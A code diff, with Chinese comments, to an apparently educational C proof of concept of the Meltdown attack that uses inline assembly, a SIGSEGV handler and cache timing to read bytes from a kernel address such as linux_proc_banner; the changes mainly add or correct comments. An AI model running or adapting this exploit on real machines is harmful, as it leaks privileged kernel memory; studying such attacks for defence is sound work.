@@ -56,16 +56,17 @@ int  reload(){  //检查check数组里每个位置读取的时间，寻找最小
 
 attack(char* addr)
 {	
-	//试探攻击指定地址的内容，是一段内嵌汇编
+	//攻击的核心代码，试探攻击指定地址的内容，是一段内嵌汇编
 
 	if (!sigsetjmp(jump,1)){//设置出现段错误信号后的跳回点
 
 	asm volatile (//volatile让编译器不会优化这段代码
-        /*下面三行来自proc内的内嵌汇编，作用是进行一定的延时保证变量静茹cache*/
+    /*下面三行来自proc内的内嵌汇编，作用是进行一定的延时保证变量进入cache*/
 		".rept 300\n\t"
 		"add $0x141, %%rax\n\t"
 		".endr\n\t"
-    /*试探读取字符
+    /*
+    试探读取字符
     这里因为proc中似乎是用协程使中断后继续进行，而本程序是捕获SIGSEGV信号，所以代码不同
     当然在movzx这里本应该失败，但是预读取会使这三段代码都会执行
     第一行必须是movzx而不是mov是因为movzx是高位如果有多余位则填充0填入指定寄存器
@@ -107,18 +108,18 @@ int max(int *score){//搜寻所有猜测中最多的
 
 int main(int argc, const char* * argv){
     
-    signal(SIGSEGV,deal_segmentation);
+    signal(SIGSEGV,deal_segmentation);//注册SIGSEGV信号的捕获函数
     int score[256]={};
     char* addr;
-    int tmp,len=20;
+    int tmp,len=20;//读取20个地址的值
     int fd = open("/proc/version", O_RDONLY);//打开一个文件，暂时不知道有什么作用，参考的是proc里的代码。如果没有
                                             //会失败。猜测和数组存入cache有关
-    sscanf(argv[1],"%lx",&addr);
+    sscanf(argv[1],"%lx",&addr);//melt.sh传来了linux_proc_banner的地址
     printf("读取该地址：%lx后%d长度的内容\n",addr,len);
     for (int j=0;j<len;j++){
         memset(score,0,sizeof(score));
         for (int i=0;i<1000;i++){//进行1000次猜测
-            score[readbyte(fd,addr)]++;
+            score[readbyte(fd,addr)]++;//猜测的值加1
         }
         tmp=max(score);
         printf("%d: %c\n",j,tmp,tmp);  
